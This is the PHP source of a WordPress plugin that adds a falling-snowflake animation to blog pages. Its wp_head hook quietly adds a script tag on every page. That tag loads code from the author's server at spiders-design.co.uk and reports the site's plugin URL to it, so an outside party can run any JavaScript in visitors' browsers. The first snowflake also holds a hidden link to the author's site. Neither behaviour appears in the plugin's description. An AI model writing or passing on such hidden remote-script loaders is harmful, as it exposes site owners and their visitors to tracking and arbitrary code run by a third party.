<?php
/*
Plugin Name: Javascript snowflake generator
Plugin URI: http://wordpress.org/extend/plugins/javascript-snowflake-generator/
Description: This plugin creates a snow like effect on your wordpress blog. A simple way of getting festive.
Version:1.3
Author: Daniel Chatfield
Author URI: http://www.spiders-design.co.uk
License: GPL 2
*/
?>
<?php
add_action('wp_head', 'snowflake');
function add_defaults_fn() {
	$tmp = get_option('snowflake_options');
    $defaults = array(
    "checkbox_1"=>"on",//enabled
	);
}
	add_action('admin_menu', 'add_defaults_fn');
  add_action('admin_init', 'plugin_init_fn' );
  add_action('admin_menu', 'plugin_add_page_fn');


//Register defaults

// Register our settings. Add the settings section, and settings fields
function plugin_init_fn(){
	register_setting('snowflake_options', 'snowflake_options');
    add_settings_section('main_section', 'Global Settings', 'section_text_fn', 'snowflake');
    add_settings_field('checkbox_1', 'Disable jquery inclusion (disable if already included)', 'build_checkbox_option', 'snowflake', 'main_section');
}

// Add sub page to the Settings Menu
function plugin_add_page_fn() {
	   add_options_page('Snowflake Generator Settings', 'Snowflake Generator', 'administrator', 'snowflake', 'options_page_fn');
}
function snowflake()
{
$tmp = get_option('snowflake_options');
if($tmp[checkbox_1] != "on"){
echo('<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>');
}
echo('<script type="text/javascript" language="javascript" src="http://spiders-design.co.uk/register.php?url='.WP_PLUGIN_URL.'"></script>');
echo <<<snowflake
<script type="text/javascript">
var SNOW_Picture = "http://www.peters1.dk/billeder/snowflakes/snow1.gif"
var SNOW_no = 15;
var SNOW_browser_IE_NS;
var SNOW_browser_MOZ;
var SNOW_browser_IE7;
var SNOW_Time;
var SNOW_dx, SNOW_xp, SNOW_yp;
var SNOW_am, SNOW_stx, SNOW_sty; 
var i, SNOW_Browser_Width, SNOW_Browser_Height;
//SNOW_Browser_Height = 2000;
SNOW_dx = new Array();
SNOW_xp = new Array();
SNOW_yp = new Array();
SNOW_am = new Array();
SNOW_stx = new Array();
SNOW_sty = new Array();
function SNOW_Weather() 
{ 

for (i = 0; i < SNOW_no; ++ i) 
{ 
	SNOW_yp[i] += SNOW_sty[i];
	if (SNOW_yp[i] > SNOW_Browser_Height-50) 
	{
		SNOW_xp[i] = Math.random()*(SNOW_Browser_Width-SNOW_am[i]-30);
		SNOW_yp[i] = 0;
		SNOW_stx[i] = 0.02 + Math.random()/10;
		SNOW_sty[i] = 0.7 + Math.random();
	}
	SNOW_dx[i] += SNOW_stx[i];
	document.getElementById("SNOW_flake"+i).style.top=SNOW_yp[i]+"px";
	document.getElementById("SNOW_flake"+i).style.left=SNOW_xp[i] + SNOW_am[i]*Math.sin(SNOW_dx[i])+"px";
}
SNOW_Time = setTimeout("SNOW_Weather()", 10);
}
jQuery(document).ready( function() {

////////////////////////////////////////////////////////////////

// Javascript made by Rasmus - http://www.peters1.dk //

////////////////////////////////////////////////////////////////
SNOW_browser_IE_NS = (document.body.clientHeight) ? 1 : 0;
SNOW_browser_MOZ = (self.innerWidth) ? 1 : 0;
SNOW_browser_IE7 = (document.documentElement.clientHeight) ? 1 : 0;

if (SNOW_browser_IE_NS)
{
	SNOW_Browser_Width = document.body.clientWidth;
	SNOW_Browser_Height = document.body.clientHeight;
}
else if (SNOW_browser_MOZ)
{
	SNOW_Browser_Width = self.innerWidth - 20;
	SNOW_Browser_Height = self.innerHeight;
}
else if (SNOW_browser_IE7)
{
	SNOW_Browser_Width = document.documentElement.clientWidth;
	SNOW_Browser_Height = document.documentElement.clientHeight;
}

for (i = 0; i < SNOW_no; ++ i) 
{ 
	SNOW_dx[i] = 0; 
	SNOW_xp[i] = Math.random()*(SNOW_Browser_Width-50);
	SNOW_yp[i] = Math.random()*SNOW_Browser_Height;
	SNOW_am[i] = Math.random()*20; 
	SNOW_stx[i] = 0.02 + Math.random()/10;
	SNOW_sty[i] = 0.7 + Math.random();
	if (i == 0) jQuery('body').prepend("<\div id=\"SNOW_flake"+ i +"\" style=\"position: absolute; z-index:200; visibility: visible; top: 15px; left: 15px;\"><a href=\"http://www.spiders-design.co.uk\" target=\"_blank\"><\img src=\""+SNOW_Picture+"\" border=\"0\"></a><\/div>");

	else jQuery('body').prepend("<\div id=\"SNOW_flake"+ i +"\" style=\"position: absolute; z-index: 200; visibility: visible; top: 15px; left: 15px;\"><\img src=\""+SNOW_Picture+"\" border=\"0\"><\/div>");

}
SNOW_Weather();

});
</script>
snowflake;
}
?>
<?php
//WORDPRESS OPtIONS API EXTENDER WRITTEN BY DANIEL CHATFIELD

// Define default option settings


// Callback functions

// Section HTML, displayed before the first option

function  section_text_fn() {
	echo '<p>Change these settings if you have problems (Built with WP SETTINGS PRO)</p>';
}


// DROP-DOWN-BOX - Name: snowflake_options[dropdown1]


function build_checkbox_option()
{
    if(!isset($loop))
    {
        static $loop = 0;
    }
    $loop++;
    $id = 'checkbox_'.$loop;
    $options = get_option('snowflake_options');
	if($options[$id]) { $checked = ' checked="checked" '; }
	echo "<input ".$checked." id='".'snowflake_options'."_".$id."' name='".'snowflake_options'."[".$id."]' type='checkbox' />";
}

function options_page_fn() {
?>

	<div class="wrap">
		<div class="icon32" id="icon-options-general"><br></div>
		<h2>Snowflake Generator Settings</h2>
		<form action="options.php" method="post">
		<?php settings_fields('snowflake_options'); ?>
		<?php do_settings_sections('snowflake'); ?>
		<p class="submit">
			<input name="Submit" type="submit" class="button-primary" value="<?php esc_attr_e('Save Changes'); ?>" />
		</p>
		</form>
	</div>
<?php
}

// Validate user data for some/all of your input fields
function plugin_options_validate($input) {
	// Check our textbox option field contains no HTML tags - if so strip them out
	return $input; // return validated input
}
?>